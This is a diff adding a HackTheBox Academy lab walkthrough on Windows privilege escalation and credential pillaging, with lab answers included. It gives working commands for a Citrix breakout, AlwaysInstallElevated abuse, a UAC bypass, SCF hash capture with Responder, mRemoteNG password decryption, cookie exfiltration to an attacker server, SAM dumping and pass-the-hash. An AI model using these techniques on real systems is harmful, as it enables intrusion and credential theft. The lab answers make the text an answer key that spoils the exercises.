@@ -1674,3 +1674,501 @@ Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -
 ```
 
 ## Restricted Environments
+
+
+**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Submit the user flag from C:\Users\pmorgan\Downloads**
+
+```
+xfreerdp /v:10.129.205.244 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
+```
+
+Visit `http://humongousretail.com/remote/`. Enter with creds:
+
+```citrixcredentials
+Username: pmorgan
+Password: Summer1Summer!
+  Domain: htb.local
+```
+
+ After login, click on the `Default Desktop` to obtain the Citrix `launch.ica` file in order to connect to the restricted environment.
+
+Run `Paint` from start menu and click on `File > Open` to open the Dialog Box.
+
+With the windows dialog box open for paint, we can enter the [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path `\\127.0.0.1\c$\users\pmorgan` under the File name field, with File-Type set to `All Files` and upon hitting enter we gain access to the desired directory.
+
+There, right click on the flag.txt file and open it with the Note editor.
+
+Results: CitR1X_Us3R_Esc@p3
+
+**Submit the Administrator's flag from C:\Users\Administrator\Desktop**
+
+
+```
+# Entering to the windows citrix env, to return to Ubuntu use CTRL-Tab
+# In ubuntu open a terminal
+sudo su
+cd /home/htb-student/Tools
+```
+
+tart a SMB server from the Ubuntu machine using Impacket's `smbserver.py` script.
+
+```shell-session
+smbserver.py -smb2support share $(pwd)
+```
+
+Back in the Citrix environment, initiate the "Paint" application via the start menu.
+
+Within this Windows dialog box associated with Paint, input the UNC path as `\\10.13.38.95\share` into the designated "File name" field.
+
+This is a file that we have hosted there: pwn.exe. This binary is the compiled binary from pwn.c:
+
+```c
+#include <stdlib.h>
+int main() {
+  system("C:\\Windows\\System32\\cmd.exe");
+}
+```
+
+We can then use the obtained cmd access to copy files from SMB share to pmorgans Desktop directory. Now we can:
+
+```
+powershell -ep bypass
+cd c:\Users\pmorgan\Desktop
+xcopy \\10.13.38.95\share\Bypass-UAC.ps1
+xcopy \\10.13.38.95\share\PowerUp.ps1
+xcopy \\10.13.38.95\share\pwn.exe
+```
+
+
+Even though without downloading these files, we could right-click the executable and get a cmd terminal. 
+
+Once we access to the terminal, we can jump to Escalating privileges.
+
+
+Using `PowerUp.ps1`, we find that [Always Install Elevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) key is present and set.
+
+We can also validate this using the Command Prompt by querying the corresponding registry keys:
+
+```cmd-session
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+
+Once more, we can make use of PowerUp, using it's `Write-UserAddMSI` function. This function facilitates the creation of an `.msi` file directly on the desktop.
+
+```powershell-session
+ Import-Module .\PowerUp.ps1
+ Write-UserAddMSI
+```
+
+Output:
+
+```powershell-session
+Output Path
+-----------
+UserAdd.msi
+```
+
+Now we can execute `UserAdd.msi` and create a new user `backdoor:password123.` under Administrators group.
+
+And:
+
+```cmd-session
+runas /user:backdoor cmd
+```
+
+For bypassing the UAC, we will use [Bypass-UAC.ps1](files/Bypass-UAC.ps1) from https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/Bypass-UAC.ps1:
+
+```powershell-session
+Import-Module .\Bypass-UAC.ps1
+Bypass-UAC -Method UacMethodSysprep
+```
+
+Following a successful UAC bypass, a new powershell windows will be opened with higher privileges and we can confirm it by utilizing the command `whoami /all` or `whoami /priv`. 
+
+```
+type c:\Users\Administrator\Desktop\flag.txt
+```
+
+**Results**: C1tr!x_3sC@p3_@dm!n
+
+## Additional Techniques
+
+**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Using the techniques in this section obtain the cleartext credentials for the SCCM_SVC user.**
+
+```
+xfreerdp /v:10.129.113.114 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
+```
+
+```
+[Shell]
+Command=2
+IconFile=\\10.10.15.105\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+
+**1.** Create the file @Inventory.sfc:
+
+```
+[Shell]
+Command=2
+IconFile=\\$IPAttacker\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+**2**  Save it in a share:
+
+```
+# Enumerate the local shares:
+Get-SmbShare
+```
+
+Output:
+
+```
+Name              ScopeName Path                 Description
+----              --------- ----                 -----------
+ADMIN$            *         C:\Windows           Remote Admin
+C$                *         C:\                  Default share
+Department Shares *         C:\Department Shares
+IPC$              *                              Remote IPC
+```
+
+In this case we have write permissions on `C:\Department Shares\Public\IT` . We save there @Inventory.sfc.
+
+**3.** Start responder in the attacker machine: 
+
+```shell-session
+sudo python3 ./Responder.py -I tun0  -w -d
+```
+
+We will get:
+
+```
+sccm_svc::WINLPE-SRV01:576fe5b6ae9591d2:70223F59AD1316DFAB43DCE951C6CA4D:010100000000000000738CE498B4DB015ABAFE6949AC79490000000002000800430050003400300001001E00570049004E002D0055005400320035004600550045004E0048005400530004003400570049004E002D0055005400320035004600550045004E004800540053002E0043005000340030002E004C004F00430041004C000300140043005000340030002E004C004F00430041004C000500140043005000340030002E004C004F00430041004C000700080000738CE498B4DB010600040002000000080030003000000000000000010000000020000020F8114B2C53009CEED83BBBC3895566AA9FF81A0BD7821F7C9DB139C50048080A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E00310030003500000000000000000000000000
+
+```
+
+We save it under name `hash`.
+
+**3.** Cracking NTLMv2 Hash with Hashcat
+
+```shell-session
+hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
+```
+
+**Results**: Password1
+
+
+ **RDP to  with user "Peter" and password "Bambi123". Access the target machine using Peter's credentials and check which applications are installed. What's the application installed used to manage and connect to remote systems?**
+
+
+```
+xfreerdp /v:10.129.190.241 /u:Peter /p:Bambi123 /cert:ignore
+```
+
+```
+# List existing programs
+$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
+
+$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
+
+
+$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
+```
+
+Output (example):
+
+```
+DisplayName                                                        DisplayVersion  InstallLocation
+-----------                                                        --------------  ---------------
+DB Browser for SQLite                                              3.12.2          C:\Program Files\DB Browser for SQLite\
+Google Chrome                                                      105.0.5195.127  C:\Program 
+... SNIP ...
+
+mRemoteNG                                                          1.76.20.24615   C:\Program Files (x86)\mRemoteNG\
+Slack (Machine - MSI)                                              4.27.154.0
+
+... SNIP ...
+```
+
+We can see the `mRemoteNG` software is installed on the system. 
+
+**Results**: mRemoteNG
+
+**Find the configuration file for the application you identify and attempt to obtain the credentials for the user Grace. What is the password for the local account, Grace?**
+
+```
+# Access the mRemoteNG config file:
+cd C:\Users\Peter\AppData\Roaming\mRemoteNG
+type confCons.xml
+```
+
+mRemoteNG Configuration File - confCons.xml:
+
+```xml
+<?XML version="1.0" encoding="utf-8"?>
+<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
+    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
+    ..SNIP..
+</Connections>
+```
+
+This XML document contains a root element called `Connections` with the information about the encryption used for the credentials and the attribute `Protected`, which corresponds to the master password used to encrypt the document.
+
+We can use this string to attempt to crack the master password. We will find some elements named `Node` within the root element.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+[<mrng:Connections ConfVersion="2.6" Protected="AllGNAWw3JJdXFuMG06ssHKpMbWw7AHXKWZVidfNIu5LNVm2nzroKSKtYYfsK66/itwh95OaYLtEX8NA7xy7IMwr" FullFileEncryption="false" KdfIterations="1000" BlockCipherMode="GCM" EncryptionEngine="AES" Export="false" Name="Connections" xmlns:mrng="http://mremoteng.org">](file:///C:/Users/Peter/AppData/Roaming/mRemoteNG/confCons.xml#)
+<Node Name="Grace_Local_Acct" InheritRDGatewayDomain="false" InheritRDGatewayPassword="false" InheritRDGatewayUsername="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayHostname="false" InheritRDGatewayUsageMethod="false" InheritVNCViewOnly="false" InheritVNCSmartSizeMode="false" InheritVNCColors="false" InheritVNCProxyPassword="false" InheritVNCProxyUsername="false" InheritVNCProxyPort="false" InheritVNCProxyIP="false" InheritVNCProxyType="false" InheritVNCAuthMode="false" InheritVNCEncoding="false" InheritVNCCompression="false" InheritExtApp="false" InheritUserField="false" InheritMacAddress="false" InheritPostExtApp="false" InheritPreExtApp="false" InheritLoadBalanceInfo="false" InheritRDPAlertIdleTimeout="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAuthenticationLevel="false" InheritICAEncryptionStrength="false" InheritUsername="false" InheritRenderingEngine="false" InheritUseCredSsp="false" InheritUseConsoleSession="false" InheritAutomaticResize="false" InheritResolution="false" InheritSoundQuality="false" InheritRedirectSound="false" InheritRedirectSmartCards="false" InheritRedirectPrinters="false" InheritRedirectPorts="false" InheritRedirectKeys="false" InheritRedirectDiskDrives="false" InheritPuttySession="false" InheritProtocol="false" InheritPort="false" InheritPassword="false" InheritPanel="false" InheritIcon="false" InheritDomain="false" InheritEnableDesktopComposition="false" InheritEnableFontSmoothing="false" InheritDisplayWallpaper="false" InheritDisplayThemes="false" InheritDescription="false" InheritColors="false" InheritCacheBitmaps="false" RDGatewayDomain="" RDGatewayPassword="" RDGatewayUsername="" RDGatewayUseConnectionCredentials="Yes" RDGatewayHostname="" RDGatewayUsageMethod="Never" VNCViewOnly="false" VNCSmartSizeMode="SmartSAspect" VNCColors="ColNormal" VNCProxyPassword="" VNCProxyUsername="" VNCProxyPort="0" VNCProxyIP="" VNCProxyType="ProxyNone" VNCAuthMode="AuthVNC" VNCEncoding="EncHextile" VNCCompression="CompNone" ExtApp="" UserField="" MacAddress="" PostExtApp="" PreExtApp="" Connected="false" RedirectKeys="false" SoundQuality="Dynamic" RedirectSound="DoNotPlay" RedirectSmartCards="false" RedirectPrinters="false" RedirectPorts="false" RedirectDiskDrives="false" CacheBitmaps="false" EnableDesktopComposition="false" EnableFontSmoothing="false" DisplayThemes="false" DisplayWallpaper="false" AutomaticResize="true" Resolution="FitToWindow" Colors="Colors16Bit" LoadBalanceInfo="" RDPAlertIdleTimeout="false" RDPMinutesToIdleTimeout="0" RDPAuthenticationLevel="NoAuth" ICAEncryptionStrength="EncrBasic" RenderingEngine="IE" UseCredSsp="true" ConnectToConsole="false" Port="3389" PuttySession="Default Settings" Protocol="RDP" Hostname="localhost" Password="s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=" Domain="PILLAGING-WIN01" Username="grace" Id="88291c0c-b6b0-4f2d-b180-81d3b50485a4" Panel="General" Icon="mRemoteNG" Descr="Grace Account" Type="Connection"/></mrng:Connections>
+```
+
+
+We can use this string to attempt to crack the master password. We will find some elements named `Node` within the root element. Those nodes contain details about the remote system, such as username, domain, hostname, protocol, and password. All fields are plaintext except the password, which is encrypted with the master password.
+
+We will use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password:
+
+```python
+#!/usr/bin/env python3
+
+import hashlib
+import base64
+from Cryptodome.Cipher import AES
+import argparse
+import sys
+
+def main():
+  parser = argparse.ArgumentParser(description="Decrypt mRemoteNG passwords.")
+  group = parser.add_mutually_exclusive_group()
+  group.add_argument("-f", "--file", help="name of file containing mRemoteNG password")
+  group.add_argument("-s", "--string", help="base64 string of mRemoteNG password")
+  parser.add_argument("-p", "--password", help="Custom password", default="mR3m")
+
+  if len(sys.argv) < 2:
+    parser.print_help(sys.stderr)
+    sys.exit(1)
+
+  args = parser.parse_args()
+  encrypted_data = ""
+  if args.file != None:
+    with open(args.file) as f:
+      encrypted_data = f.read()
+      encrypted_data = encrypted_data.strip()
+      encrypted_data = base64.b64decode(encrypted_data)
+
+  elif args.string != None:
+    encrypted_data = args.string
+    encrypted_data = base64.b64decode(encrypted_data)
+
+  else:
+    print("Please use either the file (-f, --file) or string (-s, --string) flag")
+    sys.exit(1)
+
+  salt = encrypted_data[:16]
+  associated_data = encrypted_data[:16]
+  nonce = encrypted_data[16:32]
+  ciphertext = encrypted_data[32:-16]
+  tag = encrypted_data[-16:]
+  key = hashlib.pbkdf2_hmac("sha1", args.password.encode(), salt, 1000, dklen=32)
+
+  cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+  cipher.update(associated_data)
+  plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+  print("Password: {}".format(plaintext.decode("utf-8")))
+
+if __name__ == "__main__":
+  main()
+```
+
+We will clone it:
+
+```
+https://github.com/haseebT/mremoteng-decrypt-1.git
+
+cd mremoteng-decrypt
+```
+
+```bash
+# Access our environment:
+activate tooling
+
+# Save the credentials to a file 
+echo "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=" > file.txt
+```
+
+And run the script:
+
+```
+python3 mremoteng_decrypt.py -f file.txt
+```
+
+Output: 
+```
+Password: Princess01!
+```
+
+**Results**: Princess01!
+
+
+ **Log in as Grace and find the cookies for the slacktestapp.com website. Use the cookie to log in into slacktestapp.com from a browser within the RDP session and submit the flag.**
+
+```
+xfreerdp /v:10.129.138.81 /u:Grace /p:Princess01! /cert:ignore
+```
+
+
+```powershell
+# Copy Firefox Cookies Database
+copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
+```
+
+Now we use PSUpload.ps1 to download the file to our attacking machine. We set up the uploader server in our kali:
+
+```
+python -m uploadserver
+```
+
+And from the host target machine:
+
+```
+Invoke-FileUpload -Uri http://10.10.15.105:8000/upload -File c:\Users\Grace\Desktop\cookies.sqlite
+```
+
+Now that we have the file cookies.sqlite, we use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies:
+
+The script:
+
+```python
+#!/usr/bin/env python3
+# Sample Script to extract cookies offile from FireFox sqlite database 
+# Created by PlainText 
+
+import argparse
+import sqlite3
+
+def main(dbpath, host, cookie):
+	conn = sqlite3.connect(dbpath)
+	cursor = conn.cursor()
+
+	if (host == "" and cookie == ""):
+		query = "SELECT * FROM moz_cookies"
+	elif (host != "" and cookie == ""):
+		query = "SELECT * FROM moz_cookies WHERE host LIKE '%{}%'".format(host)
+	elif (host == "" and cookie != ""):
+		query = "SELECT * FROM moz_cookies WHERE name LIKE '%{}%'".format(cookie)
+	elif (host != "" and cookie != ""):
+		query = "SELECT * FROM moz_cookies WHERE name LIKE '%{}%' AND host LIKE '%{}%'".format(cookie, host)
+
+	cursor.execute(query)
+	records = cursor.fetchall()
+	rowCount = len(records) 
+
+	if (rowCount > 0):
+		for row in records:
+			print(row)
+	else:
+		print("[-] No cookie found with the selected options.")
+
+	conn.close()
+
+if __name__ == "__main__":
+	parser = argparse.ArgumentParser()
+	parser.add_argument("--dbpath", "-d", required=True, help="The path to the sqlite cookies database")
+	parser.add_argument("--host", "-o", required=False, help="The host for the cookie", default="")
+	parser.add_argument("--cookie", "-c", required=False, help="The name of the cookie", default="")
+	args = parser.parse_args()
+	main(args.dbpath, args.host, args.cookie)
+```
+
+Basic usage:
+
+```shell-session
+python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
+```
+
+Output:
+
+```
+(10, '', 'd', 'xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)
+```
+
+Now that we have the cookie, we can use any browser extension to add the cookie to our browser. 
+
+Go to slacktestapp.com, modify the cookie and you are in.
+
+**Results**: HTB{Stealing_Cookies_To_AccessWebSites}
+
+
+**Log in as Jeff via RDP and find the password for the restic backups. Submit the password as the answer.**
+
+We know Jeff's credentials from previous exercise. They were exposed in the slack chat conversation.
+
+```
+xfreerdp /v:10.129.138.81 /u:jeff /p:Webmaster001! /cert:ignore
+```
+
+The backup password is in the Desktop, in file backup conf
+
+**Results**: Superbackup!
+
+**Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer.**
+
+```
+xfreerdp /v:10.129.138.81 /u:jeff /p:Webmaster001! /cert:ignore
+```
+
+We can  check which backups are saved in the repository using the `snapshot` command.
+
+```powershell-session
+restic.exe -r E:\restic\ snapshots
+```
+
+Output:
+
+```
+found 1 old cache directories in C:\Users\jeff\AppData\Local\restic, run `restic cache --cleanup` to remove them
+ID        Time                 Host             Tags        Paths
+--------------------------------------------------------------------------------------
+02d25030  2022-08-09 05:58:15  PILLAGING-WIN01              C:\xampp\htdocs\webapp
+24504d3d  2022-08-09 11:24:43  PILLAGING-WIN01              C:\Windows\System32\config
+7b9cabc8  2022-08-09 11:25:47  PILLAGING-WIN01              C:\Windows\System32\config
+4e7bd0cd  2022-08-09 11:55:33  PILLAGING-WIN01              C:\xampp\htdocs\webapp_old
+b2f5caa0  2022-08-17 11:43:56  PILLAGING-WIN01              C:\Windows\System32\config
+--------------------------------------------------------------------------------------
+5 snapshots
+```
+
+We can restore a backup using the ID.
+
+```powershell
+restic.exe -r E:\restic\ restore 11dcaee2 --target C:\Restore
+```
+
+Also we could launch  CMD as an admin will allow us to run reg.exe to save copies of the registry hives.
+
+```cmd
+reg.exe save hklm\sam c:\Users\jeff\Desktop\sam.save reg.exe save hklm\system c:\Users\jeff\Desktop\system.save 
+```
+
+And copy it by using PSUpload.ps1 to our local machine. Once there:
+
+```bash
+python3 ~/tools/impacket/examples/secretsdump.py -sam sam.save  -system system.save LOCAL 
+
+```
+
+**Results**: bac9dc5b7b4bec1d83e0e9c04b477f26
+
+Optional Exercises. Optional. Use the hash with a Pass-The-Hash technique to log in as the Administrator. Mark DONE when complete.
+
+```
+xfreerdp /v:10.129.138.81 /u:Administrator /pth:bac9dc5b7b4bec1d83e0e9c04b477f26 /cert:ignore
+
+crackmapexec smb 10.129.138.81 -u Administrator -H bac9dc5b7b4bec1d83e0e9c04b477f26 --exec "cmd.exe"
+
+```
